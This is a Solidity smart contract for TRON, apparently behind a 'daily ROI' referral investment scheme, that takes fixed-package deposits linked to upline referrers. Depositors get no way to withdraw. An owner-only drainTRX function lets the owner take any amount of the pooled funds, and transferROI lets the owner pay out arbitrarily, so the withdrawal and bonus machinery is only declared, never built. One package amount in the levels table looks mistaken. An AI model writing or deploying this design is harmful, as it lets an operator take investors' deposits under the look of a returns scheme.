//SourceUnit: dailyRoi.sol

pragma solidity 0.5.9;

contract currencyChain {
    struct User {
        uint256 Id;
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
    }

    address payable public owner;

    mapping(address => User) public users;

    uint8[] public ref_bonuses;                     // 1 => 1%
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    uint256[] public levels;
    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public last_id;
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _owner) public {
        levels.push(50 trx);
        levels.push(100 trx);
        levels.push(200 trx);
        levels.push(400 trx);
        levels.push(1000 trx);
        levels.push(2000 trx);
        levels.push(4000 trx);
        levels.push(8000 trx);
        levels.push(20000 trx);
        levels.push(40000 trx);
        levels.push(80000 trx);
        levels.push(1600000 trx);
        levels.push(400000 trx);
        levels.push(800000 trx);
        levels.push(1600000 trx);
        levels.push(3200000 trx);
        levels.push(6400000 trx);
        owner = _owner;
        last_id=1;
        users[owner].Id=last_id;
    }
    modifier onlyOwner(){
        require(msg.sender==owner,"onlyOwner can call!");
        _;
    }
    function drainTRX(uint256 _amount)public onlyOwner{
        owner.transfer(_amount);
    }
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

        }
    }

    function _deposit(uint256 _value, address _addr, uint256 _packageId) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        require(_value == levels[_packageId], "Invalid amount");
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _value;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits +=  _value;
        users[_addr].Id = ++last_id;
        total_deposited += _value;
        emit NewDeposit(_addr,  _value);


    }

    function deposit(address _upline,uint256 packageId) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.value,msg.sender,packageId);
    }

    function transferROI(uint256 _amount,address payable _addr) external onlyOwner {
        require(_amount > 0, "Zero payout");
        users[msg.sender].total_payouts += _amount;
        _addr.transfer(_amount);
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts,users[_addr].match_bonus);
    }
 
}